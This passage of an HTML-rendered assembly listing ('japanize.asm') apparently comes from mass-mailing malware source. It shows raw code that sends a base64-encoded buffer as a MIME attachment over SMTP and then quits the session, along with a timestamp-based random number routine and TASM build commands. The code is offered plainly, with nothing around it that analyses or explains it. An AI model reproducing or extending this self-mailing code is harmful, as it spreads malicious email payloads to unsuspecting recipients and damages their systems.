    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_MIME_h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_MIME_h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ptr_base64buf</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_MIME_e</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_MIME_e</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">
    
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_DOT_CRLF</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_DOT_CRLF</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_recv</span><span class="sc0">
    </span><span class="sc1">;;</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_QUIT</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_QUIT</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_recv</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    
    </span><span class="sc6">ret</span><span class="sc0">

    
</span><span class="sc5">rng</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;;  in</span><span class="sc0">
    </span><span class="sc1">;;   esi = range</span><span class="sc0">
    </span><span class="sc1">;;  out</span><span class="sc0">
    </span><span class="sc1">;;   eax = random number</span><span class="sc0">
    </span><span class="sc6">rdtsc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r_seed</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r_seed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

</span><span class="sc1">;*************************************************************************</span><span class="sc0">

</span><span class="sc1">;@ECHO OFF</span><span class="sc0">
</span><span class="sc1">;TASM32 /ml /m /z japanize.asm,japanize.obj</span><span class="sc0">
</span><span class="sc1">;TLINK32 -x -aa -Tpe japanize.obj,,,%import32.lib</span><span class="sc0">
</span><span class="sc1">;DEL *.OBJ</span><span class="sc0">
</span></div></body>
</html>
